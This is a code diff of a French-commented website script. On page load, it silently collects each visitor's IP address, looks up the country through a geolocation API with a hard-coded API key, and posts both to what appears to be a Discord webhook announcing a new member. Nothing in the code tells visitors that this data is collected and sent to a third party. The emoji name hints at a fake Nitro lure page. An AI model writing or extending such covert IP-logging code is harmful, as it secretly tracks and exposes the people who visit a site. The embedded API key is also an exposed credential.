@@ -6,14 +6,21 @@ const getIpAddress = async () => {
     return data.ip;
 };
 
+const getCountryFromIp = async (ipAddress) => {
+    const response = await fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=9ed8eefc86024c67b341a5ace0b43e1c&ip=${ipAddress}`);
+    const data = await response.json();
+    return data.country_name;
+};
+
 const sendWebhookOnce = async () => {
     // Vérifie si le message a déjà été envoyé en utilisant le stockage local
     if (!localStorage.getItem("webhookSent")) {
         const ipAddress = await getIpAddress();
+        const country = await getCountryFromIp(ipAddress);
 
         const embed = {
-            title: "<:FakeNitroEmoji:1209487670561210419> Nouveau membre à rejoint le site!",
-            description: `**Un nouveau membre a rejoint le site!\nAdresse IP: || ${ipAddress} ||**`,
+            title: "<:FakeNitroEmoji:1209487670561210419> Nouveau membre a rejoint le site!",
+            description: `**Un nouveau membre a rejoint le site!\nAdresse IP: || ${ipAddress} ||\nPays: ${country}**`,
             color: 0x00ff00
         };
 
@@ -37,4 +44,3 @@ const sendWebhookOnce = async () => {
 
 // Appelle la fonction au chargement de la page
 sendWebhookOnce();
-
